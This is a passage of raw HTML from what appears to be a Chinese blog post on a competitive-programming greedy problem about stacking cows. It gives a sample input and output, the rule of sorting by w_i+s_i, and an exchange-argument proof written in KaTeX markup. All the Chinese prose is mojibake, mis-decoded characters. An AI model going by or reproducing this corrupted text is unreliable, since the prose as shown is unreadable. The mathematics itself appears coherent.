style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">10 3</span><br><span class="line">2 5</span><br><span class="line">3 3</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="è´ªå¿ƒ-8">è´ªå¿ƒ</h3><p><strong>åšæ³•</strong> <strong>æŒ‰ç…§<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub><mo>+</mo><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_i+s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ä»å°åˆ°å¤§æ’åºï¼Œæœ€å¤§çš„å±é™©ç³»æ•°ä¸€å®šæ˜¯æœ€å°çš„ã€‚</strong></p><blockquote><p>æ€è·¯ï¼šè¿™TMè°èƒ½æƒ³åˆ°ï¼Ÿï¼ˆ<br>æ¯å¤´ç‰›çš„å±é™©å€¼ = å®ƒä¸Šé¢ç‰›çš„é‡é‡å’Œ - è‡ªèº«çš„å¼ºå£®å€¼<br>è¦ä½¿å¾—æŸå¤´ç‰›çš„å±é™©å€¼æœ€å°ï¼Œæ˜¾ç„¶ä¸wå’Œséƒ½æœ‰å…³â€¦â€¦ç„¶åå°±é çŒœäº†</p></blockquote><p><strong>è¯æ˜</strong> é‡‡ç”¨è°ƒæ•´æ³•</p><p>è‹¥ä¸æŒ‰ç…§ä¸Šè¿°æ–¹æ³•ï¼Œä¸€å®šä¼šå­˜åœ¨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub><mo>+</mo><msub><mi>s</mi><mi>i</mi></msub><mo>&gt;</mo><msub><mi>w</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">w_i+s_i &gt; w_{i+1} + s_{i+ 1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></p><p>å…³æ³¨è¿™iå’Œ(i+1)å±‚äº¤æ¢å‰åç‰›çš„å±é™©ç³»æ•°ï¼ˆå…¶ä»–ä½ç½®ä¸å—å½±å“ï¼‰ï¼š</p><table><thead><tr><th></th><th>ç¬¬iä½ç½®çš„ç‰›</th><th>ç¬¬i+1ä½ç½®çš„ç‰›</th></tr></thead><tbody><tr><td>äº¤æ¢å‰</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>âˆ‘</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>âˆ’</mo><mn>1</mn></mrow></msubsup><msub><mi>w</mi><mi>j</mi></msub><mo>âˆ’</mo><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\sum_{j=1}^{i-1}w_j-s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4004em;vertical-align:-0.4358em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9646em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>âˆ‘</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>âˆ’</mo><mn>1</mn></mrow></msubsup><msub><mi>w</mi><mi>j</mi></msub><mo>+</mo><msub><mi>w</mi><mi>i</mi></msub><mo>âˆ’</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">\sum_{j=1}^{i-1}w_j+w_i-s_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4004em;vertical-align:-0.4358em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9646em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></td></tr><tr><td>äº¤æ¢å</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>âˆ‘</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>âˆ’</mo><mn>1</mn></mrow></msubsup><msub><mi>w</mi><mi>j</mi></msub><mo>âˆ’</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">\sum_{j=1}^{i-1}w_j-s_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4004em;vertical-align:-0.4358em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9646em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>âˆ‘</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>âˆ’</mo><mn>1</mn></mrow></msubsup><msub><mi>w</mi><mi>j</mi></msub><mo>+</mo><msub><mi>w</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>âˆ’</mo><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\sum_{j=1}^{i-1}w_j+w_{i+1}-s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4004em;vertical-align:-0.4358em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9646em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td></tr></tbody></table><p>æ¯ä¸ªå¼å­å°†å»<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>âˆ‘</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>âˆ’</mo><mn>1</mn></mrow></msubsup><msub><mi>w</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\sum_{j=1}^{i-1}w_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4004em;vertical-align:-0.4358em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9646em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>åï¼Œå†åŠ ä¸Š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>i</mi></msub><mo>+</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">s_i+s_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span>å¾—åˆ°ï¼š</p><table><thead><tr><th></th><th>ç¬¬iä½ç½®çš„ç‰›</th><th>ç¬¬i+1ä½ç½®çš„ç‰›</th></tr></thead><tbody><tr><td>äº¤æ¢å‰</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">s_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub><mo>+</mo><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_i+s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td></tr><tr><td>äº¤æ¢å</td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>s</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">w_{i+1}+s_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></td></tr></tbody></table><p>ç”±äº <span class="katex"><span class="katex-mathml"><math 